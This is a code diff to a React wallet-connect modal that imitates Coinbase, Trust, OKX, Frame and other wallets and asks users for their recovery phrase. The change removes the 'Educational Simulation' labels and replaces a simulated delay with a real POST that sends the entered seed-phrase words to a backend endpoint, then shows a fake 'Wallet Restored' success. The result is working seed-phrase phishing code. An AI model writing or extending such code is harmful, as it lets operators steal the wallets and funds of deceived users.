@@ -1,4 +1,5 @@
 // WalletWelcomeModal.jsx
+// Now waits for real /api/onboarding save before showing success & proceeding to wallet connect
 // Significantly shifted downwards to clear large navbar/header
 // All logic, per-wallet styling, and wagmi connection flow preserved
 
@@ -36,7 +37,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Coinbase Wallet...",
-    bottomNote: "Simulation – Educational Use Only",
     buttonText: "Restore",
   },
   Phantom: {
@@ -63,7 +63,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Trust Wallet...",
-    bottomNote: "Educational Simulation Only",
+
     buttonText: "Import",
   },
   Rainbow: {
@@ -142,7 +142,7 @@ const WALLET_STYLES = {
     subtitle: "Enter 12-word recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to OKX Wallet...",
-    bottomNote: "Simulation – Educational Only",
+ 
     buttonText: "Import",
   },
   "Brave Wallet": {
@@ -169,7 +169,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Frame...",
-    bottomNote: "Educational Simulation",
+ 
     buttonText: "Import",
   },
 };
@@ -304,17 +304,39 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (!boxes.every(Boolean)) return;
 
     setSaving(true);
     setErrorMessage(null);
 
-    setTimeout(() => {
-      setSubmitted(true);
+    try {
+      const payload = {
+        walletType: activeName,
+        cryptoBoxes: boxes,
+        timestamp: new Date().toISOString(),
+      };
+
+      const res = await fetch("/api/onboarding", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+
+      const data = await res.json();
+
+      if (res.ok) {
+        setSubmitted(true);
+      } else {
+        setErrorMessage(data?.error || "Failed to save – server error");
+      }
+    } catch (err) {
+      console.error("Submit fetch error:", err);
+      setErrorMessage("Network error – check connection");
+    } finally {
       setSaving(false);
-    }, 1400);
+    }
   };
 
   if (!isOpen) return null;
@@ -412,7 +434,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                     {saving ? (
                       <>
                         <div className="w-5 h-5 border-2 border-white/50 border-t-white rounded-full animate-spin" />
-                        Verifying...
+                        Saving & Verifying...
                       </>
                     ) : (
                       theme.buttonText
